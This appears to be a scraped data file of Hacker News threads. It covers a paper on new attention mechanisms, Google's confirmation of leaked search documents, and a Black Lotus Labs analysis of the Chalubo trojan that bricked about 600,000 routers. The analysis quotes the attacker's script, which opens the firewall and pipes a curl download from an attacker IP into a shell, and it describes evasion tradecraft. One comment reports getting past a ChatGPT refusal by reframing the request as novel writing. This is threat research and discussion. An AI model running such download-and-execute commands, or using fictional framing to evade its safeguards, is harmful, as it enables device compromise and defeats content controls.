\"natural\" or your researchers publish early results or you have employee movement between companies or whatever). Riskier strategies won't be touched, and you'll have $BILLIONS spent duplicating the same most likely alternatives when $MILLIONS would have sufficed. The normal counterpoint is that a few big players dominate the spending, and they would have higher internal coordination. Interestingly though, they don't usually, except when that coordination would tend to enforce the same strategies smaller competition are pursuing. How often do you hear about stories like the misaligned Google+ integrations resulting in employee bonuses for poor customer experiences vs a forward-thinking executive actively devoting funds to a meaningful number of competing solutions? Approximately never. It's career suicide if you fail and depend on other people for your position, you _are_ actually more likely to outdo the competition with your increased resources if you just lean into the \"best\" alternatives, and for a whole host of reasons very few executives (except for people with real power) will coordinate a more comprehensive strategy, certainly not one orthogonal to the competition's just for the sake of allocating the global $BILLIONS more efficiently. Separately (going back to the merits of the preprint), I'll probably read the full thing later, but a few points stuck out as suspicious on an initial skim. Notably, they seem to mix linear transformations in different domains. E.g., `xa` is linear in both `x` and `a`, and `vx` is linear in both `v` and `x`, but `xax` is _not_ linear in `x`, even if you try to \"prove\" that idea with `v = xa`. Linearity in `v` isn't enough to make the composition linear in `x`. A lot of their results seem to rely on eliminating those \"redundant\" computations, even though the things they're replacing with linear computations are actually higher order polynomials. On an initial skim, the other \"novel\" ideas also don't seem well grounded. Their experimental results are decent. That could mean a lot of things (normally that the authors made more errors in their competitors' than in their own work), but it's probably worth looking into for a few hours despite my other complaints. reply hansvm 17 hours agorootparent [â€“] It's too late to edit. My initial skepticism was unfounded. Separately, the paper largely comprises of \"super attention\" and everything else. The \"everything else\" part of the paper might matter, but it's basically just operator fusion and the impacts of doing so on training dynamics, except they left out the impact on performance for different model parameters and didn't study how training dynamics impact the result. It's not a new idea, even on the ML arxiv, I'm glad they got good results, and it needs more study before being sold so strongly. The \"super attention\" part of the paper is interesting. It basically ups the matrix polynomial rank of an attention layer by 1 and claims good results from the process. That's believable, especially given that the main contribution of attention is good empirical results from upping the previous layer matrix polynomial rank by a bit. You'd want to dive into the code and check that they didn't screw up the masking before taking the results at face value though (information leakage can make even very weak models seem to perform well). reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The paper \"You Need to Pay Better Attention\" by Mehran Hosseini and Peyman Hosseini introduces three new attention mechanisms: Optimised Attention, Efficient Attention, and Super Attention.",
      "Optimised Attention reduces parameters by 25% and requires one fewer matrix multiplication per head, while Efficient Attention halves the parameters and reduces matrix multiplications by two per head, doubling the speed.",
      "Super Attention significantly outperforms standard attention in vision and natural language processing tasks, evaluated on datasets like MNIST, CIFAR100, IMDB Movie Reviews, and Amazon Reviews."
    ],
    "commentSummary": [
      "Recent research introduces new attention mechanisms like Optimised Attention, Efficient Attention, Super Attention, and Infini-attention, which outperform standard multi-head attention in efficiency and performance.",
      "The 2D Discrete Fourier Transform (DFT) is being explored as a potential replacement for attention mechanisms, with discussions on its integration in neural networks and efficiency gains noted in the FNet paper.",
      "The conversation highlights the complexity of AI systems, the environmental impact of large models, and the industry's risk aversion, emphasizing the need for more experiments and validation of new techniques."
    ],
    "points": 229,
    "commentCount": 44,
    "retryCount": 0,
    "time": 1717011192
  },
  {
    "id": 40518016,
    "title": "Google Confirms Authenticity of 2,500 Leaked Search Documents",
    "originLink": "https://www.theverge.com/2024/5/29/24167407/google-search-algorithm-documents-leak-confirmation",
    "originBody": "Tech/ Google/ Creators Google confirms the leaked Search documents are real Google confirms the leaked Search documents are real / Until today, the company refused to comment on the authenticity of the trove of documents. By Mia Sato, platforms and communities reporter with five years of experience covering the companies that shape technology and the people who use their tools. May 29, 2024, 10:12 PM UTC Share this story Illustration: The Verge A collection of 2,500 leaked internal documents from Google filled with details about data the company collects is authentic, the company confirmed today. Until now, Google had refused to comment on the materials. The documents in question detail data that Google is keeping track of, some of which may be used in its closely guarded search ranking algorithm. The documents offer an unprecedented â€” though still murky â€” look under the hood of one of the most consequential systems shaping the web. â€œWe would caution against making inaccurate assumptions about Search based on out-of-context, outdated, or incomplete information,â€ Google spokesperson Davis Thompson told The Verge in an email. â€œWeâ€™ve shared extensive information about how Search works and the types of factors that our systems weigh, while also working to protect the integrity of our results from manipulation.â€ The existence of the leaked material was first outlined by search engine optimization (SEO) experts Rand Fishkin and Mike King, who each published initial analyses of the documents and their contents earlier this week. Google did not respond to The Vergeâ€™s multiple requests for comment yesterday about the authenticity of the leak. The leak is likely to cause ripples across the SEO industry The leaked material suggests that Google collects and potentially uses data that company representatives have said does not contribute to ranking webpages in Google Search, like clicks, Chrome user data, and more. The thousands of pages of documents act as a repository of information for Google employees, but itâ€™s not clear what pieces of data detailed are actually used to rank search content â€” the information could be out of date, used strictly for training purposes, or collected but not used for Search specifically. The documents also do not reveal how different elements are weighted in search, if at all. Still, the information made public is likely to cause ripples across the search engine optimization (SEO), marketing, and publishing industries. Google is typically highly secretive about how its search algorithm works, but these documents â€” along with recent testimony in the US Department of Justice antitrust case â€” have provided more clarity around what signals Google is thinking about when it comes to ranking websites. The choices Google makes on search have a profound impact on anyone relying on the web for business, from small independent publishers to restaurants to online stores. In turn, an industry of people hoping to crack the code or outsmart the algorithm has cropped up, delivering sometimes conflicting answers. Googleâ€™s vagueness and mincing of words has not helped, but the influx of internal documents offers, at least, a sense of what the company dominating the web is thinking. Most Popular Most Popular Google confirms the leaked Search documents are real Google wonâ€™t comment on a potentially massive leak of its search algorithm documentation Electric bikes are about to get more expensive, and the timing couldnâ€™t be worse All of Microsoftâ€™s MacBook Air-beating benchmarks Discordâ€™s turning the focus back to games with a new redesign Verge Deals / Sign up for Verge Deals to get deals on products we've tested sent to your inbox weekly. Email (required)Sign up By submitting your email, you agree to our Terms and Privacy Notice. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply. From our sponsor Advertiser Content From",
    "commentLink": "https://news.ycombinator.com/item?id=40518016",
    "commentBody": "Google confirms the leaked Search documents are real (theverge.com)222 points by alanzhuly 20 hours agohidepastfavorite55 comments jeroenhd 13 hours agoI was afraid of this. Now, it's a matter of time before Google search will get even worse as SEO hustlers push more of their useless crap to the top now that internal algorithm data has been published. Guess I should look into that Kagi thing people keep mentioning. reply josefresco 4 hours agoparentThe leak essentially confirmed what SEO experts already suspected (knew) but Google denied. SEOs have spent 2+ decades observing Google search behavior and honestly I wasn't even a little bit surprised their observations were proven correct. At this point, the \"garbage\" on Google isn't SEO optimized organic results, it's the ads. reply aaronwall 7 minutes agorootparentFor what it is worth, Google has favored macro-parasites over micro-parasites. The bigger companies have access to the ears of market regulators, etc. The average small publisher or affiliate site has almost nobody care if it disappears. Part of the most recent Google update was penalizing high authority trusted sites for publishing off topic content from third parties. There is a concept called \"goog enough\" explaining how the likes of Forbes ranked for just about everything. https://www.blindfiveyearold.com/its-goog-enough reply altdataseller 9 hours agoparentprevI doubt that will happen. One becsuse the leak didnt really disclose any major secrets that most marketers didnt already know. 2, even if some of this wasnt widely known, its not like you can take advantage of it overnight. Theres no quick hack to building a trustworthy domain or getting lots of trustworthy links for example reply tmaly 8 hours agoparentprevWhat could be worse than recipe pages that are 20 pages worth of text with the recipe hiding somewhere among the text? reply aaronwall 6 minutes agorootparentSites that have a poor user experience by design create the ranking signals for their own demotion by such design. Get a lot of traffic from search with not many people liking the destination page and that ranking will quickly go away. reply Mathnerd314 2 hours agorootparentprevFor me the recipe sites are pretty usable (with adblock), there is generally a \"jump to recipe\" button to skip past the text. And sometimes I even read the text, if it is a good recipe the text often has useful information like substitutions and preparation techniques. Certainly a \"just the recipe\" website format would be worse SEO-wise, but I am not so sure it would be more useful. reply dgellow 6 hours agorootparentprevThey could split it in multiple pages instead of a single page! Imagine having to click â€œnext partâ€ >10 times just to see if you eventually end up with a section that contains the actual recipe reply cush 5 hours agorootparentAnd unskippable ads after every third image. Then the moment you get to the final image thereâ€™s an email registration wall. It has a little X button that doesnâ€™t work on iOS. reply dgellow 1 hour agorootparentI see that we have a connoisseur of the devilâ€™s work here :) reply IncreasePosts 2 hours agorootparentprevAlmost all of them now have a \"jump to recipe\" link at the top of the page. reply drivebycomment 12 hours agoparentprevIt doesn't look like this leak will do that. This doesn't have \"algorithms\" in any real sense of algorithms. reply Jensson 12 hours agorootparentBefore SEO communities argued what were part of the model, thinking some things like clicks didn't matter. Truth is Google did everything you can imagine, including clicks, now they all know it instead of having to guess. Still wont change much though, its very hard to game since Google has a lot of ways of mitigating click farms or it would have discovered a long time ago. reply aaronwall 3 minutes agorootparentBack in the day a friend mentioned you could choose what version of a phrase you wanted to make the canonical for a search autocompletion by embedding a broken image call to a SERP page for the version of a keyword you wanted to be more popular. Google has tons of ways to identify real users versus fake users. And lots of the fake it until you make it efforts leave statistical outliers that can lead to ignoring or smoothing away much of the benefits, especially if there is no fire following the smoke trail. reply rnd0 9 hours agoparentprevIsn't Kagi dependant on Google for their results? Doesn't seem tenable in the long-term to me. reply elromulous 8 hours agorootparentAre you thinking of ddg? Afaik kagi runs their own independent engine from scratch. reply SushiHippie 7 hours agorootparentKagi is a Meta Search engine (it uses other search engines API e.g. Google, Yandex, Brave Search, Marginalia, ...) + it has its own (tiny) index, their own index mostly consits of their \"Small Web\" pages. reply jeroenhd 8 hours agorootparentprevDDG uses Bing. Them blocking trackers except when they come from Microsoft (because of this search engine deal) is why I don't really care about using DDG. You can use bangs to search on Google, but that's not the default. reply hoppyhoppy2 8 hours agorootparentprev>Our own index of the finest results augmented by the results from the best search engines on the market. https://kagi.com/ reply aaronwall 0 minutes agorootparentThe design is too monochromatic. disagree123 11 hours agoparentprevnext [3 more] [flagged] regnerba 10 hours agorootparentCare to expand upon that? I have been using Kagi for just under a year so far and really enjoying it. reply viraptor 10 hours agorootparentIt's a troll. Downvote, move on. reply Awtem 3 hours agoprevGood encryption should still hold, even if you know the algorithm. The same reasoning should be applied to search engines. reply blueflow 10 hours agoprev10 years ago \"chrome botnet\" was a meme. And now we get the evidence for it. I don't know what to say. reply nioj 18 hours agoprevRelated discussion: https://news.ycombinator.com/item?id=40514491 reply jader201 18 hours agoparentWhich is a dupe of: https://news.ycombinator.com/item?id=40496967 reply Dxtros 1 hour agoprevto get real answers from humans and not marketing campaigns I constantly put reddit in my search. I feel like 5 years ago that wasnâ€™t necessary. reply whatamidoingyo 16 minutes agoparent> not marketing campaigns > reddit A great marketing tactic is to pose as reddit users. If you have just 2-3 realistic accounts, you can ask a question as account 1, and write your answer with account 2. Now imagine a company with $$$. They can guide an entire thread. reply rexreed 7 hours agoprevIn not too many years, the average user will be prompting to get their needs met, rather than searching a flawed search system, wading through pages of sponsored and SEO-gamified links, opening up multiple tabs to try to dig out the details from sites hustling whatever they hustle, and then trying to read to get their needs met. Google sees the writing on the wall, which is going towards a prompt-based direct ask system mediated by an LLM. It definitely is far from perfect now, but the writing is on the wall. Search and SEO are both going to be relics of a bygone past in not too many years. reply mrgoldenbrown 1 hour agoparentThe same forces that drowned us in SEO crap will drown us in LLMO crap. Hopefully we'll enjoy a brief period of usefulness first. reply mu53 6 hours agoparentprevI don't know. There were recently some documents released on how OpenAI was soliciting companies to integrate their product recommendations more deeply into the training data. This is obvious a huge way to monetize chatgpt-like products. Rather than SEO optimized sites gathering the ad revenue with click bait and gamification, OpenAI will collect the revenue themselves. At the end of this enshittification, users will be looking for other options. Imagine a salesman that is ignoring the elephant in the room to tell you that if you bought this brand of shoes, you would run faster instead of giving tips on the skills to learn to be a better runner. Search is a great way to find high-quality references and non-hallucinated answers by tweaking the keywords slightly. A salesman-like LLM might be pushing products when you just need information. ChatGPT's authority is going to dwindle, and search is a good tool to find authoritative sources reply _heimdall 1 hour agorootparentI'd argue that sales is entirely a game of ignoring the elephant in the room and selling someone on something they don't already think they need. Its not really sales if I go into a shoe store and say I want a pair of Air Jordan 4s in size 11, that's just customer service. reply janmo 9 hours agoprevThe main takeaway is that Google has been lying and gaslighting about their ranking factors. The main lies that were uncovered is that they are indeed using clicks, and chrome browser data for ranking purposes. Summary of their lies here: https://www.reddit.com/r/SEO/comments/1d2gllz/google_caught_... reply _heimdall 1 hour agoparentI don't understand why anyone would trust those lies though. For a very long time Google has been a data and advertising business with a monopolistic hold on browsers, search, analytics, and advertising. Of course they use those together to make more money. reply pixxel 4 hours agoparentprevhttps://old.reddit.com/r/SEO/comments/1d2gllz/google_caught_... reply beeboobaa3 10 hours agoprevAny good summaries about what was revealed in the leak? reply janmo 9 hours agoparentThe main takeaway for me is that Google is caught lying. Many things were already assumed but Google used to deny them. - They claimed that clicks were not a ranking factor, it turns out it is. - Also turns out that they are using Chrome data for ranking purposes (Not good for the ongoing lawsuit) - There is also a field called something like \"is small personal site\" and it presumed that those sites are penalized. You can find a summary here: https://www.reddit.com/r/SEO/comments/1d2gllz/google_caught_... reply kobalsky 6 hours agorootparentdidnâ€™t they just leak the schema? we know they may be tracking that information but we donâ€™t know how it affects the model reply _heimdall 1 hour agorootparentWould they track the data if they haven't been using it, or didn't expect to use it in the future? reply jongjong 13 hours agoprev [â€“] Google should change their algorithm to rank websites randomly; they all show up in search results with equal probability, so long as they exceed a certain threshold of relevance for the user's keywords (the threshold could vary for different keywords but would be made public and there could be instructions on how to meet the threshold requirements so it doesn't have to be a secret and anyone should be able to get their sites showing for at least one set of specific keywords). That would make it impossible to game. Maybe they could have 5 slots in a side container for 'Top trending' for those keywords for the current day, week, month or year (the user can choose the granularity). Problem solved. reply xyzzy123 13 hours agoparentYou would game it by creating more websites. reply jcpham2 2 hours agorootparentOther others have stated below this does in fact become a cat-versus-mouse Sybil attack scenario where the barrier to entry isn't high enough to stop a bad actor from creating many websites. Like online identity and reputation has to be tied to more than just an email address. reply jongjong 13 hours agorootparentprevBut would be difficult to build a lot of websites which all meet the threshold for specific keywords. The thresholds don't have to be particularly low. In fact it's better if they require a certain amount of work to meet. So maybe only a relatively small number of websites would qualify for a specific niche keyword but the idea is that, among those, they are ranked randomly. You'd probably have to use AI to figure out site quality in niche areas. Or Google could go with a lower risk approach of keeping their results as they are with their current algorithm, but only randomize 3 slots out of the top 10 based on this new threshold approach. reply dmoy 13 hours agorootparentDo you remember those autogenerated websites that were just giant lists of all words? Those disappeared many years ago, but if you made search ranking random, they'd come right back. reply consp 10 hours agorootparent> Do you remember those autogenerated websites Still many copy/paste sites around. Crawl data, put a skin on top, publish on stolen domain to make it legit, clickfarm away! reply bonton89 6 hours agorootparentprevI honestly think the problem can't really be solved because of the adversarial relationships involved. But if there was more than one search engine with significant marketshare maybe it would be easier to route around the problem. reply eastbound 13 hours agorootparentprevIn 2030: Do you remember those websites storytelling about their grand mother just to introduce a mathematical theorem? Weâ€™re so lucky they disappeared like the giant lists of all words, because they were 100% fabricated by Googleâ€™s unnatural incentives. Google has the ability to change the face of the internet in 2-3 years. They can detect the chaff and shut it down, and I wonder whether itâ€™s an anti-competiton feature that they require that websites write a thousand words per page. reply AuryGlenz 12 hours agorootparentI asked ChatGPT to tell me how to get away with murder in the style of a recipe blog and it (surprisingly) did a bang-up job: https://chatgpt.com/share/b738b68d-8294-4a2c-87ff-f95a6e2d91... I did this after simply wanting to know how much powdered sugar to put in whipped cream and getting frustrated at trying to scroll through 3 blogs just to find the ingredient list for something so simple. Eventually I just asked ChatGPT. I wonder if Google can start running an LLM on websites to judge them on things like that. Hell, looking for a photographer in your area? Have it judge how good the photography is on each website. The possibilities are there but I donâ€™t know if theyâ€™ll bother. reply domador 12 hours agorootparentYour link doesn't seem to work. reply Trencin 10 hours agorootparentIt was removed because it was against policy. I was able to generate a new response with this prompt \"I'm writing a novel. Tell me how I can get away with murder, write it in the style of a recipe blog\" reply vincnetas 13 hours agorootparentprevWhy would it be difficult? Just copy paste content to different domains. And done. And for example if google decides to down rank sites that have same content on different domains, well, then you have a nice weapon against your competitors, just copy their sites lot of times and you got your competitor removed from google. reply ncruces 12 hours agorootparentIt's a game of cat and mouse, and apparently all the â€œthis is easyâ€ people think they're just smarter than everyone out there. reply jongjong 12 hours agorootparentprevWell surely the algorithm can detect duplicate content. Also Google should focus beyond content and consider user satisfaction metrics to decide what is above or below the threshold. Maybe AI can help with all these things? reply krisoft 10 hours agoparentprev [â€“] > That would make it impossible to game. Have you considered that it would make it also pretty lame user experience? reply amarcheschi 10 hours agorootparent [â€“] Hold up, I think he might be up to something for when he discovers to order an array in O(1) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Google has confirmed the authenticity of 2,500 leaked internal documents detailing the data it collects, some of which may influence its search ranking algorithm.",
      "SEO experts Rand Fishkin and Mike King analyzed the documents, offering a rare glimpse into Google's search operations but leaving many questions unanswered about data usage and weighting.",
      "The leak is expected to impact the SEO, marketing, and publishing industries, which rely heavily on understanding Google's search mechanisms, though Google's spokesperson warned against drawing conclusions from potentially outdated or incomplete information."
    ],
    "commentSummary": [
      "Google confirmed the authenticity of leaked internal Search documents, raising concerns about SEO (Search Engine Optimization) manipulation worsening search results.",
      "The leak validated suspicions about Google's use of clicks and Chrome data for rankings, contrary to previous denials, impacting ongoing lawsuits and highlighting issues like ad dominance and challenges for smaller publishers.",
      "Discussions include the evolution of SEO, the potential of AI-driven systems like ChatGPT to replace traditional search engines, and suggestions to randomize website rankings to prevent manipulation, though concerns about commercialization and bias persist."
    ],
    "points": 222,
    "commentCount": 55,
    "retryCount": 0,
    "time": 1717023058
  },
  {
    "id": 40525130,
    "title": "Massive Cyberattack Disables 600,000 SOHO Routers, Requires Hardware Replacements",
    "originLink": "https://blog.lumen.com/the-pumpkin-eclipse/",
    "originBody": "TECHNOLOGIES BLACK LOTUS LABS CLOUD EDGE COMPUTE COLLABORATION MANAGED SERVICES NETWORK SECURITY BUSINESS ADVICE BUSINESS CONTINUITY & DISASTER RECOVERY CUSTOMER EXPERIENCE DATA DRIVEN BUSINESS OPERATIONAL EFFICIENCY TECH TRENDS INDUSTRIES FINANCIAL SERVICES HEALTHCARE GAMING MANUFACTURING MEDIA AND ENTERTAINMENT PHARMACEUTICAL PUBLIC SECTOR RETAIL TECHNOLOGY ABOUT US LEADERSHIP PERSPECTIVES NEWSROOM Technologies Business Advice Industries About Us The Pumpkin Eclipse Black Lotus Labs Posted On May 30, 2024 30.5K Views Facebook Twitter LinkedIn Pinterest Email Share Executive Summary Lumen Technologiesâ€™ Black Lotus Labs identified a destructive event, as over 600,000 small office/home office (SOHO) routers were taken offline belonging to a single internet service provider (ISP). The incident took place over a 72-hour period between October 25-27, rendered the infected devices permanently inoperable, and required a hardware-based replacement. Public scan data confirmed the sudden and precipitous removal of 49% of all modems from the impacted ISPâ€™s autonomous system number (ASN) during this time period. Our analysis identified â€œChalubo,â€ a commodity remote access trojan (RAT), as the primary payload responsible for the event. This trojan, first identified in 2018, employed savvy tradecraft to obfuscate its activity; it removed all files from disk to run in-memory, assumed a random process name already present on the device, and encrypted all communications with the command and control (C2) server. We suspect these factors contributed to there being only one report on the Chalubo malware family to date. Chalubo has payloads designed for all major SOHO/IoT kernels, pre-built functionality to perform DDoS attacks, and can execute any Lua script sent to the bot. We suspect the Lua functionality was likely employed by the malicious actor to retrieve the destructive payload. Lumenâ€™s global telemetry indicates the Chalubo malware family was highly active in November 2023 and remained so into early 2024. Based on a 30-day snapshot in October, Lumen identified over 330,000 unique IP addresses that communicated with one of 75 observed C2 nodes for at least two days, indicating a confirmed infection. This suggests that while the Chalubo malware was used in this destructive attack, it was not written specifically for destructive actions. We suspect the threat actors behind this event chose a commodity malware family to obfuscate attribution, instead of using a custom-developed toolkit. At this time, we do not have an overlap between this activity and any known nation-state activity clusters. We assess with high confidence that the malicious firmware update was a deliberate act intended to cause an outage, and thought we expected to see a number of router make and models affected across the internet, this event was confined to the single ASN. Destructive attacks of this nature are highly concerning, especially so in this case. A sizeable portion of this ISPâ€™s service area covers rural or underserved communities; places where residents may have lost access to emergency services, farming concerns may have lost critical information from remote monitoring of crops during the harvest, and health care providers cut off from telehealth or patientsâ€™ records. Needless to say, recovery from any supply chain disruption takes longer in isolated or vulnerable communities. This report will walk through the open-source observations surrounding the attack, and transition into discussing the infection process we observed in October 2023. We will dissect the malware functionality, subsequent malware families dropped, and the malware familyâ€™s global footprint. Introduction In late October 2023, Lumen Technologiesâ€™ Black Lotus Labs became aware of a large and growing number of complaints on public internet forums and outage detectors. We began an investigation after seeing repeated complaints mentioning specific ActionTec devices, as a massive number of device owners stated that they were not able to access the internet beginning on October 25, 2023. A growing number of users indicated the outage was common to two different gateway models: the ActionTec T3200s and ActionTec T3260s, both displaying a static red light. Users described calls with customer support centers where they were told the entire unit would need to be replaced. These reports led us to believe the problem was likely a firmware issue, as most other issues could be resolved through a factory reset. To independently confirm these claims and corroborate data, we began with the affected device names. On October 27, we queried the scan data repository Censys for â€œActionTecâ€ to identify the top service providers by Autonomous System Number (ASN), based upon device count. Listing by ASNs, we searched for the number of exposed devices associated with each over a one-week snapshot. Our analysis revealed that one specific ASN had a drop of roughly 49% in the number of devices exposed to the internet. We compared the banner hashes that were present on this ASN on October 27, to the banner hashes present on October 28th and observed a drop of ~179k IP addresses that had an ActionTec banner. This included a drop of ~480k devices associated with Sagemcom, likely the Sagemcom F5380 as both this model and the ActionTec modems were both modems issued by the ISP. Figure 1: Internet scan data showing the number of devices the week of the attack in the impacted ASN Having verified a potential impact to a specific ASN, we queried Black Lotus Labs global telemetry for connections from that ASN, leading us to the first payload server â€“ which had an open directory. Our finding shows the path of a multi-stage infection mechanism that would install the Chalubo RAT, a botnet with a global footprint targeting SOHO gateways and IoT devices. Figure 2: Logical Infection process with corresponding C2 nodes Technical Details At this time, we are unsure of the exploit used to gain initial access. When searching for exploits impacting these models in OpenCVE for ActionTec, none were listed for the two models in question, suggesting the threat actor likely either abused weak credentials or exploited an exposed administrative interface. Bash Scripts and Loader Once exploited, devices reach out to a first stage payload server and retrieve the â€œget_scrpcâ€ bash script, the first step in the infection process. When retrieved, the script proceeded to check for the presence of the malicious binary in the following file path: â€œ/usr/bin/usb2rci.â€ If the binary was not found it opens the iptables rules to allow both inbound and outbound connections, retrieves the â€œget_scrpcâ€ script and executes. if [ -f /usr/bin/usb2rci ]; then exit; fi iptables -P INPUT ACCEPT;iptables -P OUTPUT ACCEPT; curl http://104.233.210.119:51248/get_scrpc/bin/sh Figure 3: Excerpt of the malicious script Next, the get_scrpc script decides if the md5 hash of the usb2rci file matches a known string. If not matched, it retrieves the payload from one of the first stage payload servers. One such URL was hxxp://104.233.210[.]119:51248/get_fwuueicj. The last step retrieves a second bash script called â€œget_strtriiusj.â€ This script verifies the presence of a file named â€œ/tmp/.adiisu,â€ if the file was present it would exit. If not, it would create the file, then copy the main payload file to the /tmp/ directory and rename it â€œ/tmp/crrs.â€ With access to the tmp directory it can modify the permissions to make it executable, and then execute the file. This loader file appeared to be compiled on October 25, 2023, at 9:55:18 UTC. It was a big-endian shared object, .so file, compiled for MIPS R3000 CPU. When the malware ran, it attempted to retrieve some host-based information such as the MAC address, device ID, device type, device version and the local IP. Chalubo would first try to send that information to the threat actor-created domain and URL at coreconfig[.]net8080/E2XRIEGSOAPU3Z5Q8. If unable to resolve the domain, it would fall back to the hard-coded IP address 185.189.240[.]13, which is where the current domain resolved on October 30, 2023. As for the binary â€œget_fwuueicj,â€ it first forks itself and then attempts to open the file â€œ/tmp/tmp.lck,â€ or â€œ/var/tmp/tmp.lckâ€ and then â€œ/data/local/tmp/tmp.lckâ€ if /tmp/tmp.lck fails. Figure 4: The loader file calling the various lock file locations Next it adjusts oom_adj and oom_score_adjust to their lowest values in order to prevent an outâ€“ofâ€“memory error from killing the process. Following that, it deletes itself from disk and changes the process name to a random creation of the same length as the original process name by using prctl option PR_SET_NAME. Figure 5: showing the executable calling the â€œoomâ€ adjustment to not get killed From here, Chalubo cycles through a list of hardcoded C2s, appended with the host architecture, and attempts to download the next stage. Figure 6: function to retrieve the Chalubo agent If successful in contacting the C2, it downloads and decrypts the second stage using ChaCha20 with a hardcoded key and nonce: Figure 7: Nonce and key used to encrypt C2 comms for the first stage Figure 8: ChaCha20 decryption method for network-based comms The second stage is written to disk as /tmp/file.lck, or failing that, /va/tmp/file.lck. The stage is executed using execv, and then the file is deleted by the first stage. It appears the first stage sleeps for 30 minutes upon successful C2 contact and then beacons again. Figure 9: First stage C2 comms downloading main Chalubo payload Chalubo Bot â€“ Main Payload While our report is focused upon the MIPS variant of the malware, we have discovered payloads designed for all the major SOHO/IoT kernels variants such as ARM, MIPS, PowerPC, etc. The infection mechanism process was done remarkably well, which would account for why there was only a single report surrounding this malware family. This botnetâ€™s tradecraft included: Deleting both the loader and Chalubo agent from the file system once they were executed. Renaming the process once run on the impacted system to hamper detection. Using ChaCha-encrypted communications to retrieve the main payload, then embedding a second set of encryption keys and nonce to decrypt subsequent Lua scripts. Inserting a 30-minute delay in between the initial beacon to evade sandbox-detection. The ability to execute arbitrary Lua scripts on the host machine, the likely mechanism for threat actors to issue commands to be run on the modem and retrieve subsequent modules for added functionality. The only mistake we observed on the threat actorâ€™s part was in using the exact same encryption key and nonce that was previously documented in the 2018 report. Another oddity stood out during analysis as we identified a handful of commands related to DDoS functions, however, when we saw infected machines receive commands to launch DDoS attacks, they did not use the embedded binariesâ€™ functionality. This further suggests a disconnect between the developers and operators of some bots. We assess that it would be trivial to use this Lua execution feature to retrieve subsequent payloads from other locations on the internet. As we see in the graphic below, the binary began by forking and making the same changes to the oom_adj and oom_score_adj files, deleting itself on disk, and renaming the process to a random filename. Then it loads and executes an embedded Lua script. The Lua script handles the network communications for the second stage. Figure 10: C2 communication loop in Lua The script contains the same hardcoded C2s as the previous stage, but the URL is appended with â€œ/res.datâ€ instead of the architecture. The POST includes information about the infected device such as its mac address, device tag that likely correlates to a campaign tag, the kernel type, and the local IP address. Figure 11: Second stage C2 comms The response from the C2 is encrypted as with the first stage using the same nonce but a different key. Figure 12: Encryption key and nonce embedded within the Chalubo trojan Some of the embedded functions associated with the binary were associated with DDoS attacks. Figure 13: DDoS attack functions embedded within the Chalubo binary Lua Scripts The embedded ChaCha20 encryption keys and nonce found in the October 2023 Chalubo binary are the same ones previously identified by the Sophos report in 2018. This newer version does not appear to have any persistence and deletes all traces of itself from disk. Thus far we have been able to recover a handful of Lua scripts from the C2, including a script to specify the parameters for a DDoS attack against a handful of different domains listed in the IOC section. One note of interest, is that while there was embedded functionality in the binary to perform different types of DDoS attacks, the operators chose not to use the ability. Given that none of the Lua scripts called the binaryâ€™s functions during our analysis, we suspect this Lua script functionality was likely used perform every action, and the Lua engine would be used to retrieve and execute the destructive payload. We have not yet been able to recover the destructive module. Global Telemetry Associated With Chalubo Malware While there were interactions between the impacted ASN and payload servers, we needed to determine if this was an isolated event or if similar activity patterns were occurring elsewhere in the world with other Chalubo bot infections. Examining the botâ€™s ecosystem, we found that from September to November of 2023, there were about 45 malware panels on the internet. While 28 of the panels interacted with 10 or fewer bots, the top ten panels interacted with anywhere between ~13,500 to ~117,000 unique IP addresses over a 30-day timeframe. Telemetry associated with those IP addresses revealed that over 650K unique IP addresses had contact with at least one controller over a 30-day period ending on November 3. Another observation from this timeframe showed that 95% of the bots communicated with only one control panel. This suggests the entity behind these operations had distinct silos of operations: whereas most botnets tend to communicate with multiple C2 nodes for greater redundancy in case one server was taken offline. A closer look at the data showed that roughly half of those bots communicated with C2s for just one to two days. We felt this could denote various internet noise, such as scanners or security researchers, so we removed all suspect IP addresses from the dataset. With the cleaned dataset we plotted the IP addresses and their corresponding country for the timeframe in which the event took place, and generated the following heat map: Figure 14: Global heat map showing the distribution of bots by distinct IP addresses October 2023 By analyzing the controllers, we identified a tier-two server located at 103.140.187[.]149, which appeared to administer controllers around the globe. Using URLScan to investigate this address brought us to the landing page, which showed only a login panel. During this timeframe only one panel was used for the destructive attack. This led us to believe that while Chalubo itself was the RAT used to perform the destructive event, not all Chalubo infections resulted in a destructive attack. This suggests that the malicious cyber actor behind this event likely purchased a panel for non-attribution. Conclusion Black Lotus Labs has reported on SOHO activity from hacktivist, cybercriminals and nation-state actors over the past several years. However, this investigation stood out for two reasons. First, this campaign resulted in a hardware-based replacement of the affected devices, which likely indicates that the attacker corrupted the firmware on specific models. The event was unprecedented due to the number of units affected â€“ no attack that we can recall has required the replacement of over 600,000 devices. In addition, this type of attack has only ever happened once before, with AcidRain used as a precursor to an active military invasion. At this time, we do not assess this to be the work of a nation-state or state-sponsored entity. In fact, we have not observed any overlap with known destructive activity clusters; particularly those prone to destructive events such as Volt Typhoon, or SeaShell Blizzard. The second unique aspect is that this campaign was confined to a particular ASN. Most previous campaigns weâ€™ve seen target a specific router model or common vulnerability and have effects across multiple providersâ€™ networks. In this instance, we observed that both Sagemcom and ActionTec devices were impacted at the same time, both within the same providerâ€™s network. This led us to assess it was not the result of a faulty firmware update by a single manufacturer, which would normally be confined to one device model or models from a given company. Our analysis of the Censys data shows the impact was only for the two in question. This combination of factors led us to conclude the event was likely a deliberate action taken by an unattributed malicious cyber actor, even if we were not able to recover the destructive module. Black Lotus Labs has added the IoCs from both this campaign and the Chalubo malware into the threat intelligence feed that fuels the Lumen Connected Security portfolio. We continue to monitor new infrastructure, targeting activity, and expanding TTPs including those in this report, and will provide updates as appropriate. We will continue to collaborate with the security research community to share findings related to this activity and ensure the public is informed. We encourage the community to monitor as well as alert on these and any similar IoCs. To protect networks from equipment-based compromises we recommend the following: Organizations that manage SOHO routers: make sure devices do not rely upon common default passwords. They should also ensure that the management interfaces are properly secured and not accessible via the internet. For more information on securing management interfaces, please see DHSâ€™ CISA BoD 23-02 on securing networking equipment. Consumers with SOHO routers: Users should follow best practices of regularly rebooting routers and installing security updates and patches. For guidance on how to perform these actions, please see the â€œbest practicesâ€ document prepared by Canadian Centre for Cybersecurity. For additional IoCs associated with this campaign, please visit our GitHub page. If you would like to collaborate on similar research, please contact us on social media @BlackLotusLabs. This information is provided â€œas isâ€ without any warranty or condition of any kind, either express or 